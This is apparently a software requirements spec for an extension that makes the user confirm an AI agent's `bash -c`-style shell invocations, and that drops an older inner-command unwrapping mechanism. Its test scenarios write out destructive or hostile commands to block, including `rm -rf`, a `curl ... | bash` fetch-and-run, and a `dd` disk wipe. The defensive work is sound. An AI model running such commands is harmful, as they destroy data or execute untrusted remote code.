## ADDED Requirements

### Requirement: Detect shell -c command invocation

The extension SHALL detect any invocation of `bash -c`, `sh -c`, `zsh -c`, or `fish -c` and prompt the user for confirmation. These shell `-c` invocations execute arbitrary code strings and are treated as inherently sensitive regardless of the inner command content.

The detection SHALL be performed via regex matching against the preprocessed command string (after quote and comment stripping). The shell name and `-c` flag MUST be separated by whitespace. The detection MUST NOT require or perform unwrapping of the inner command string.

#### Scenario: Block bash -c

- **WHEN** the agent executes `bash -c "git push --force origin main"`
- **THEN** the extension SHALL block the command and prompt the user for confirmation

#### Scenario: Block sh -c with system command

- **WHEN** the agent executes `sh -c "rm -rf /tmp"`
- **THEN** the extension SHALL block the command and prompt the user for confirmation

#### Scenario: Block zsh -c with arbitrary code

- **WHEN** the agent executes `zsh -c "echo hello && curl http://example.com/script | bash"`
- **THEN** the extension SHALL block the command and prompt the user for confirmation

#### Scenario: Block sudo bash -c

- **WHEN** the agent executes `sudo bash -c "dd if=/dev/zero of=/dev/sdb bs=1M"`
- **THEN** the extension SHALL block the command. The `bash -c` pattern matches the preprocessed command; `sudo` is an additional matching pattern but only one block reason is presented.

## REMOVED Requirements

### Requirement: Strip privilege-escalation prefixes in shell-wrapper detection

**Reason**: The `extractShellWrappedCommand` function, `PRIVILEGE_RE` regex, and the privilege-stripping mechanism are removed. Shell `-c` invocations are now detected directly as sensitive patterns rather than unwrapped and recursively inspected.

**Migration**: Any code relying on `extractShellWrappedCommand` or `PRIVILEGE_RE` should be updated to reference the flat sensitive pattern array instead. The behavioral change: `sudo bash -c "harmless command"` previously would not block if the inner command was harmless; now all `bash -c` invocations block.
